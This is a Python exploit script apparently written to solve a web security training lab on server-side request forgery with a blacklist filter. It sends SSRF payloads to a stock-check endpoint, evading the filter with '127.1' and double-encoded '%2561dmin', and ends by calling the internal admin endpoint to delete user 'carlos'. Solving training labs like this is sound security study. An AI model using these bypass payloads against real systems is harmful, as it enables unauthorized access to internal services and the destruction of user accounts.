# Server-side request forgery (SSRF) attacks 11 of 23
# Lab: SSRF with blacklist-based input filter

import asyncio
from pprint import pprint
from common.base import run_payloads

RAW_REQUEST_POST = """
POST /product/stock HTTP/2
Host: 0abb006d0438140e80f1493400d2000c.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0abb006d0438140e80f1493400d2000c.web-security-academy.net/product?productId=3
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0abb006d0438140e80f1493400d2000c.web-security-academy.net
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: session=iwSfFoYlEleyLXKr3ZMDMZt561Tv5RG0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
TE: trailers

stockApi=@@@PAYLOAD@@@
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        code = result["status_code"]
        print(f" CALL FAILED (code {code})")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    # Original post
    raw_req_0 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1")
    print('PLAIN POST:', end='')
    await print_net_result(raw_req_0, True)

    raw_req_1 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "http%3A%2F%2F127.0.0.1%2Fadmin")
    print('POST for 127.0.0.1/admin:', end='')
    await print_net_result(raw_req_1, True)

    raw_req_2 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "http%3A%2F%2F127.1%2Fadmin")
    print('POST for 127.1/admin:', end='')
    await print_net_result(raw_req_2, True)

    raw_req_3 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "http%3A%2F%2F127.1%2F%2561dmin")
    print('POST for 127.1/%2561dmin:', end='')
    await print_net_result(raw_req_3, True)

    # It prints "failed" (due to status code 302, not 200) but Carlos is deleted correctly!
    raw_req_4 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "http%3A%2F%2F127.1%2F%2561dmin%2Fdelete?username%3Dcarlos")
    print(f'Delete carlos:', end='')
    await print_net_result(raw_req_4, True)

if __name__ == "__main__":
    asyncio.run(main())